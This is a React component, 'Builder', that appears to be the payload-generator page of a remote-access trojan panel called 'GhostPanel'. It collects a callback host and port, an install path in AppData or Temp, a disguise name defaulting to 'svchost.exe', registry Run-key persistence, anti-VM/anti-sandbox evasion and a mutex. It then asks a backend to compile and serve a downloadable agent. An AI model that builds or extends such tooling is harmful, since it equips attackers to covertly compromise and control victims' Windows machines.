import React, { useState } from 'react';
import { Hammer, Download, Wifi, HardDrive, Lock, Zap, Ghost, Terminal as TermIcon, ShieldCheck } from 'lucide-react';
import { API_BASE_URL } from '../config';

export default function Builder() {
  const [host, setHost] = useState('');
  const [port, setPort] = useState('9000');
  const [showConsole, setShowConsole] = useState(false);
  
  // Configs
  const [installEnabled, setInstallEnabled] = useState(false);
  const [installPath, setInstallPath] = useState('%APPDATA%');
  const [fileName, setFileName] = useState('svchost.exe');
  const [startup, setStartup] = useState(false);
  
  const [antiVM, setAntiVM] = useState(false);
  const [mutex, setMutex] = useState('Global\GhostPanel_Mutex');

  const [downloadUrl, setDownloadUrl] = useState('');
  const [status, setStatus] = useState('');
  const [loading, setLoading] = useState(false);

  const generateMutex = () => {
      const random = Math.random().toString(36).substring(2, 15);
      setMutex(`Global\Ghost_${random}`);
  };

  const handleBuild = async () => {
    setLoading(true);
    setStatus('Compiling payload...');
    setDownloadUrl('');
    
    try {
      const res = await fetch(`${API_BASE_URL}/api/build`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            host, port, show_console: showConsole,
            // If install is disabled, send install_path but force startup false or handle in backend
            // Ideally, the backend uses 'startup' flag to trigger install() function.
            // Let's map 'installEnabled' to the backend's 'startup' logic or separate them?
            // In agent.cpp logic: if (ENABLE_INSTALLATION) Install();
            // So we send installEnabled as 'startup' (legacy name in backend) or update backend.
            // Let's reuse 'startup' field for 'installation master switch' and add a new 'persistence' field?
            // No, let's keep it simple: 
            // In Builder.jsx, we send 'startup' as (installEnabled && startup).
            // Wait, Install() function does BOTH copy AND registry add.
            // If user wants Install ONLY (copy) but NO startup, agent.cpp needs modification.
            // Current agent.cpp Install() does RegSetValueExA unconditionally.
            // For now, let's assume Install = Copy + Startup.
            // If you want to separate them, we need to update agent.cpp.
            // Let's assume Install Enabled = Copy to Path + Run from there.
            // Startup Enabled = Add to Registry.
            
            // Current agent.cpp: ENABLE_INSTALLATION triggers Install() which does BOTH.
            // We should split this in agent.cpp later for fine-grained control.
            // For this UI update, let's map:
            // startup: installEnabled (Global switch for Install function)
            // But wait, the user asked for "Startup" as a sub-feature.
            // Let's send installEnabled as 'startup' for now, as that's what triggers Install().
            // The sub-checkbox 'startup' will just be UI sugar for now unless I update C++.
            // ACTUALLY: I'll map 'startup' in JSON to installEnabled. The sub-checkbox 'startup' will just be UI sugar for now unless I update C++.
            // Let's update C++ if needed, but for now:
            startup: installEnabled, 
            
            install_path: installPath,
            anti_vm: antiVM, mutex, file_name: fileName
        }),
      });
      
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'Unknown server error');
      if (data.url) {
        setDownloadUrl(`${API_BASE_URL}${data.url}`);
        setStatus('Build Success');
      }
    } catch (e) {
      setStatus('Error: ' + e.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-5xl mx-auto mt-6 mb-10">
      <div className="bg-[#1a1a1a] border border-[#333] rounded-sm overflow-hidden shadow-2xl">
        <div className="bg-[#222] px-6 py-4 border-b border-[#333] flex items-center gap-3">
          <Hammer size={20} className="text-cyan-400" />
          <h2 className="text-lg font-semibold text-gray-200 tracking-wide uppercase">Payload Generator</h2>
        </div>
        
        <div className="p-8 grid grid-cols-1 lg:grid-cols-2 gap-12">
            {/* Left Column: Network & Install */}
            <div className="space-y-8">
                <div>
                    <h3 className="text-cyan-400 font-bold text-sm uppercase mb-4 flex items-center gap-2"><Wifi size={16}/> Connection</h3>
                    <div className="space-y-4 pl-2 border-l border-[#333]">
                        <div>
                            <label className="block text-xs uppercase text-gray-500 font-bold mb-2 tracking-wider">LHOST (IP)</label>
                            <input className="w-full bg-[#111] border border-[#333] text-gray-200 p-3 rounded-sm focus:border-cyan-400 outline-none font-mono text-sm" value={host} onChange={(e) => setHost(e.target.value)} placeholder="192.168.1.50" />
                        </div>
                        <div>
                            <label className="block text-xs uppercase text-gray-500 font-bold mb-2 tracking-wider">LPORT</label>
                            <input className="w-full bg-[#111] border border-[#333] text-gray-200 p-3 rounded-sm focus:border-cyan-400 outline-none font-mono text-sm" value={port} onChange={(e) => setPort(e.target.value)} placeholder="9000" />
                        </div>
                    </div>
                </div>

                <div>
                    <div className="flex items-center justify-between mb-4">
                        <h3 className={`font-bold text-sm uppercase flex items-center gap-2 transition ${installEnabled ? 'text-cyan-400' : 'text-gray-600'}`}>
                            <HardDrive size={16}/> Installation
                        </h3>
                        <label className="relative inline-flex items-center cursor-pointer">
                            <input type="checkbox" checked={installEnabled} onChange={(e) => setInstallEnabled(e.target.checked)} className="sr-only peer"/>
                            <div className="w-9 h-5 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-cyan-600"></div>
                        </label>
                    </div>
                    
                    <div className={`space-y-4 pl-2 border-l border-[#333] transition-all duration-300 ${installEnabled ? 'opacity-100' : 'opacity-30 pointer-events-none grayscale'}`}>
                        <div>
                            <label className="block text-xs uppercase text-gray-500 font-bold mb-2 tracking-wider">Install Path</label>
                            <select className="w-full bg-[#111] border border-[#333] text-gray-200 p-3 rounded-sm focus:border-cyan-400 outline-none text-sm" value={installPath} onChange={(e) => setInstallPath(e.target.value)}>
                                <option value="%APPDATA%">%AppData% (Roaming)</option>
                                <option value="%TEMP%">%Temp% (Temporary)</option>
                            </select>
                        </div>
                        <div>
                            <label className="block text-xs uppercase text-gray-500 font-bold mb-2 tracking-wider">Process Name</label>
                            <input className="w-full bg-[#111] border border-[#333] text-gray-200 p-3 rounded-sm focus:border-cyan-400 outline-none font-mono text-sm" value={fileName} onChange={(e) => setFileName(e.target.value)} placeholder="svchost.exe" />
                        </div>
                        
                        <div className="pt-2">
                            <label className="flex items-center gap-3 cursor-pointer group">
                                <input type="checkbox" checked={startup} onChange={(e) => setStartup(e.target.checked)} disabled={!installEnabled} className="w-5 h-5 accent-cyan-400 bg-gray-800 border-gray-600 rounded cursor-pointer" />
                                <span className={`text-sm font-bold flex items-center gap-2 ${startup ? 'text-white' : 'text-gray-500'}`}><Zap size={14}/> Registry Startup Persistence</span>
                            </label>
                            <p className="text-[10px] text-gray-600 pl-8 mt-1">Automatically run the installed payload on Windows boot (HKCU\Run).</p>
                        </div>
                    </div>
                </div>
            </div>

            {/* Right Column: Stealth & Options */}
            <div className="space-y-8">
                <div>
                    <h3 className="text-cyan-400 font-bold text-sm uppercase mb-4 flex items-center gap-2"><Lock size={16}/> Stealth & Options</h3>
                    <div className="space-y-4 pl-2 border-l border-[#333]">
                        <div>
                            <label className="block text-xs uppercase text-gray-500 font-bold mb-2 tracking-wider">Mutex (Single Instance)</label>
                            <div className="flex gap-2">
                                <input className="w-full bg-[#111] border border-[#333] text-gray-200 p-3 rounded-sm focus:border-cyan-400 outline-none font-mono text-sm" value={mutex} onChange={(e) => setMutex(e.target.value)} />
                                <button onClick={generateMutex} className="bg-[#333] hover:bg-[#444] text-white px-3 rounded-sm text-xs font-bold">RND</button>
                            </div>
                        </div>
                        
                        <div className="space-y-3 pt-2">
                            <label className="flex items-center gap-3 cursor-pointer group">
                                <input type="checkbox" checked={antiVM} onChange={(e) => setAntiVM(e.target.checked)} className="w-5 h-5 accent-cyan-400 bg-gray-800 border-gray-600 rounded cursor-pointer" />
                                <span className="text-sm text-gray-300 group-hover:text-white transition flex items-center gap-2"><Ghost size={14}/> Anti-VM / Anti-Sandbox</span>
                            </label>
                            <label className="flex items-center gap-3 cursor-pointer group">
                                <input type="checkbox" checked={showConsole} onChange={(e) => setShowConsole(e.target.checked)} className="w-5 h-5 accent-cyan-400 bg-gray-800 border-gray-600 rounded cursor-pointer" />
                                <span className="text-sm text-gray-300 group-hover:text-white transition flex items-center gap-2"><TermIcon size={14}/> Show Console (Debug)</span>
                            </label>
                        </div>
                    </div>
                </div>

                <div className="pt-8">
                    <button 
                        onClick={handleBuild}
                        disabled={loading || !host}
                        className={`w-full py-4 rounded-sm font-bold uppercase tracking-widest text-sm flex items-center justify-center gap-2 transition-all
                            ${loading || !host 
                            ? 'bg-[#333] text-gray-600 cursor-not-allowed' 
                            : 'bg-cyan-900/20 text-cyan-400 border border-cyan-900/50 hover:bg-cyan-400 hover:text-black hover:shadow-[0_0_20px_rgba(0,255,255,0.3)]'
                            }`}
                    >
                        {loading ? 'Compiling Agent...' : 'Generate Artifact'}
                    </button>
                    
                    {downloadUrl && (
                        <div className="mt-6 text-center animate-fade-in">
                            <div className="inline-block bg-green-900/10 border border-green-500/30 p-4 rounded-sm">
                                <div className="text-green-400 font-bold mb-2 flex items-center justify-center gap-2">
                                    <Download size={18}/> BUILD SUCCESSFUL
                                </div>
                                <a href={downloadUrl} download className="text-sm text-gray-300 hover:text-white underline decoration-cyan-500 underline-offset-4">
                                    Download Payload
                                </a>
                            </div>
                        </div>
                    )}
                    {status && !downloadUrl && <div className="mt-4 text-center text-xs text-gray-500 font-mono">{status}</div>}
                </div>
            </div>
        </div>
      </div>
    </div>
  );
}
